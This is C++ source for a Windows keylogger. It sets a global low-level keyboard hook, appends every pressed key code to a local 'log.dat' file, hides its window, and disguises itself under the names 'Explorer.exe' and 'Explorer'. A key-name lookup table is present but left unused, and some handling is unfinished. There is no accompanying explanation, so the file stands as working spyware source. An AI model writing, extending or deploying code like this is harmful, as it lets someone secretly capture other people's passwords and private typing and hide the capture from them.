#include <Windows.h>
#include <fstream>
#include <map>

using namespace std;

// Global variables
std::ofstream logFile;
HHOOK keyboardHook = nullptr;
NOTIFYICONDATA notifyIconData;

auto getVKCodeValue(DWORD vkCode) {
    map <DWORD, string> codeMap;
    codeMap[8] = "BCKSPC";
    codeMap[9] = "TAB";
    codeMap[12] = "CLEAR";
    codeMap[13] = "ENTER";
    codeMap[16] = "SHIFT";
    codeMap[17] = "CTRL";
    codeMap[18] = "ALT";
    codeMap[19] = "PAUSE";
    codeMap[20] = "CAPS LOCK";
    codeMap[27] = "ESC";
    codeMap[32] = " ";
    codeMap[33] = "PgUP";
    codeMap[34] = "PgDN";
    codeMap[35] = "END";
    codeMap[36] = "HOME";
    codeMap[37] = "←";
    codeMap[38] = "↑";
    codeMap[39] = "→";
    codeMap[40] = "↓";
    codeMap[41] = "SELECT";
    codeMap[42] = "PRINT";
    codeMap[43] = "EXECUTE";
    codeMap[44] = "PRTSC";
    codeMap[45] = "INS";
    codeMap[46] = "DEL";
    codeMap[47] = "HELP";
    codeMap[48] = "0";
    codeMap[49] = "1";
    codeMap[50] = "2";
    codeMap[51] = "3";
    codeMap[52] = "4";
    codeMap[53] = "5";
    codeMap[54] = "6";
    codeMap[55] = "7";
    codeMap[56] = "8";
    codeMap[57] = "9";
    codeMap[65] = "A";
    codeMap[66] = "B";
    codeMap[67] = "C";
    codeMap[68] = "D";
    codeMap[69] = "E";
    codeMap[70] = "F";
    codeMap[71] = "G";
    codeMap[72] = "H";
    codeMap[73] = "I";
    codeMap[74] = "J";
    codeMap[75] = "K";
    codeMap[76] = "L";
    codeMap[77] = "M";
    codeMap[78] = "N";
    codeMap[79] = "O";
    codeMap[80] = "P";
    codeMap[81] = "Q";
    codeMap[82] = "R";
    codeMap[83] = "S";
    codeMap[84] = "T";
    codeMap[85] = "U";
    codeMap[86] = "V";
    codeMap[87] = "W";
    codeMap[88] = "X";
    codeMap[89] = "Y";
    codeMap[90] = "Z";
    codeMap[91] = "LWIN";
    codeMap[92] = "RWIN";
    codeMap[93] = "APP";
    codeMap[95] = "SLP";
    codeMap[96] = "NUMPAD0";
    codeMap[97] = "NUMPAD1";
    codeMap[98] = "NUMPAD2";
    codeMap[99] = "NUMPAD3";
    codeMap[100] = "NUMPAD4";
    codeMap[101] = "NUMPAD5";
    codeMap[102] = "NUMPAD6";
    codeMap[103] = "NUMPAD7";
    codeMap[104] = "NUMPAD8";
    codeMap[105] = "NUMPAD9";
    codeMap[106] = "MUL";
    codeMap[107] = "ADD";
    codeMap[108] = "SEP";
    codeMap[109] = "SUB";
    codeMap[110] = "DEC";
    codeMap[111] = "DIV";
    codeMap[112] = "F1";
    codeMap[113] = "F2";
    codeMap[114] = "F3";
    codeMap[115] = "F4";
    codeMap[116] = "F5";
    codeMap[117] = "F6";
    codeMap[118] = "F7";
    codeMap[119] = "F8";
    codeMap[120] = "F9";
    codeMap[121] = "F10";
    codeMap[122] = "F11";
    codeMap[123] = "F12";
    codeMap[124] = "F13";
    codeMap[125] = "F14";
    codeMap[126] = "F15";
    codeMap[127] = "F16";
    codeMap[144] = "NUMLOCK";
    codeMap[160] = "LSHIFT";
    codeMap[161] = "RSHIFT";
    codeMap[162] = "LCNTRL";
    codeMap[163] = "RCNTRL";
    return codeMap.find(vkCode);
}

// Function to handle key press and write to log file
void HandleKeyPress(DWORD vkCode)
{
    // Open the log file in append mode
    logFile.open("log.dat", ios_base::app);

    // Write the key code to the log file
    if (vkCode == 8) {

    }
    logFile << vkCode << " ";

    // Close the log file
    logFile.close();
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // Extract key information from the event
        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;

        // Check if a key is being pressed (key down event)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Handle the key press
            HandleKeyPress(vkCode);
        }
    }

    // Pass the event to the next hook procedure
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            // Set up the keyboard hook
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);
            if (keyboardHook == nullptr)
            {
                MessageBox(hwnd, "Failed to set up keyboard hook.", "Error", MB_OK | MB_ICONERROR);
                DestroyWindow(hwnd);
                return -1;
            }

            // Set up the system tray icon
            ZeroMemory(&notifyIconData, sizeof(NOTIFYICONDATA));
            notifyIconData.cbSize = sizeof(NOTIFYICONDATA);
            notifyIconData.hWnd = hwnd;
            notifyIconData.uID = 1;
            notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
            notifyIconData.uCallbackMessage = WM_USER + 1;
            notifyIconData.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
            lstrcpy(notifyIconData.szTip, "Explorer");
            Shell_NotifyIcon(NIM_ADD, &notifyIconData);

            // Minimize the window
            ShowWindow(hwnd, SW_HIDE);
            break;
        }

        case WM_CLOSE:
            // Unhook the keyboard hook
            if (keyboardHook != nullptr)
            {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = nullptr;
            }

            // Remove the system tray icon
            Shell_NotifyIcon(NIM_DELETE, &notifyIconData);

            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        case WM_USER + 1:
            // Handle system tray icon messages
//            switch (lParam)
//            {
//                case WM_LBUTTONDOWN:
//                    // Show or hide the window when the left mouse button is clicked on the system tray icon
//                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
//                    break;
//            }

            break;

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

// Entry point of the application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register the window class
    const char *CLASS_NAME = "MyWindowClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc))
    {
        MessageBox(nullptr, "Failed to register window class.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Create the window
    HWND hwnd = CreateWindowEx(
            0,
            CLASS_NAME,
            "Explorer.exe",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            nullptr,
            nullptr,
            hInstance,
            nullptr
    );

    if (hwnd == nullptr)
    {
        MessageBox(nullptr, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(hwnd, nullptr, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Cleanup
    if (keyboardHook != nullptr)
    {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }

    return 0;
}